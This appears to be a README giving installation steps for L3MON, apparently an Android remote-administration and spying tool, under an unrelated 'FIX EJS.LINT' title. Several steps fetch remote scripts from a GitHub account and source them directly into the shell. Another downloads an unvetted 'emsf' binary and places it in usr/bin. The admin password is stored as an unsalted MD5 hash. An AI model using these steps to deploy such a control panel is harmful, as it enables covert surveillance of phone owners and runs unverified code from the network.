<h1>FIX EJS.LINT</h1>

<p style=text-align:center> Made with ❤️ By <a href="//D3VL.com" target="_blank">D3VL</a></p>
<p> Maintainer <a href="www.instagram.com/blv.crt" target="_blank">E0NSAP</a></p>

Installation

    Install JRE 8 (We cannot stress this enough USE java 1.8.0 ANY issues that don't use this will be closed WITHOUT a response)
        Debian, Ubuntu, Etc
        Ubuntu chroot
            sudo apt install wget curl git npm nano nodejs openjdk-8-jdk openjdk-8-jre
            source <(curl -fsSL https://raw.githubusercontent.com/efxtv/npm/main/apktool/apktool-kali-ubuntu.sh)
        Termux
            pkg update && pkg upgrade
            source <(curl -fsSL https://raw.githubusercontent.com/efxtv/npm/main/apktool/apktool-termux.sh) 
            source <(curl -fsSL https://raw.githubusercontent.com/efxtv/npm/main/L3mon-no-java8.sh) 
            curl -L -o $PWD/emsf https://github.com/efxtv/EMSF/blob/main/termux/emsf?raw=true -s;chmod +x emsf;mv emsf ../usr/bin/ 
        Fedora, Oracle, Red Hat, etc
            su -c "yum install java-1.8.0-openjdk"
        Windows
            click HERE for downloads

    Install NodeJS Instructions Here (If you can't figure this out, you shouldn't really be using this)

    install PM2
        npm install pm2 -g
        npm install
        npm audit fix
        npm audit

    Download and Extract the latest release from HERE

    In the extracted folder, run these commands
        npm install <- install dependencies
        pm2 start index.js <-- start the script
        pm2 startup <- to run L3MON on startup

    Set a Username & Password
        Stop L3MON pm2 stop index
        Open maindb.json in a text editor
        MD5 Hash echo -n efxtv | openssl md5|awk '{print $2}'
        under admin
            set the username as plain text
            set the password as a LOWERCASE MD5 hash
        save the file
        run pm2 restart all

    in your browser navigate to http://127.0.0.1:22533

